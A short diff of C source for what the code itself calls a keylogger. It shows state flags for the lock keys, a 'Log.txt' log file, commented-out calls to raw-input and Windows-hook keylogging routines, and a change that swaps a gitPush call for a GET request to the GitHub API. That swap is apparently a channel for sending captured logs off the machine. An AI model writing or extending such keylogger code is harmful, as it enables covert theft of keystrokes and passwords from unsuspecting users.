@@ -2,6 +2,8 @@
 
 bool caps = false, numLk = false, scrLk = false;
 
+
+
 int main(int argc, char* argv[]) {
 	const char fileName[] = "Log.txt";
 
@@ -15,7 +17,8 @@ int main(int argc, char* argv[]) {
 	//KeyLogger_RawInput();	
 	//KeyLogger_SetWindowsHook();
 
-	gitPush("12345");
+	GET("www.api.github.com/repos");
+	printf("done\n");
 	getchar();
 }
 
